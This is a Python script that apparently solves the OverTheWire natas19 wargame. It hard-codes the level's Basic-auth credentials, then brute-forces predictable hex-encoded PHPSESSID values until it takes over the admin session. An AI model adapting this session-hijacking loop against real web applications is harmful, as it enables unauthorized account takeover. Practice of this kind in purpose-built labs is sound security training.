import requests

headers = {
    'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='
}

username = 'admin'
password = 'admin'

url = f"http://natas19.natas.labs.overthewire.org/index.php?username={username}&password={password}&debug"

def create_phpsessid(index: int, username: str):
    prefix = ''.join([f"3{i}" for i in str(index)])
    salt = '2d'
    suffix = ''.join(map(lambda ch: hex(ord(ch)).strip('0x'), [ch for ch in username]))

    return f"{prefix}{salt}{suffix}"

for index in range(1, 1000):
    phpsessid = create_phpsessid(index, username)

    cookies = { 'PHPSESSID': phpsessid }

    request = requests.post(url=url, headers=headers, cookies=cookies)

    content = request.content.decode('utf-8')

    if 'You are logged in as a regular user.' not in content:
        print(content, phpsessid)
        break

    else:
        print(index, phpsessid, ':(')
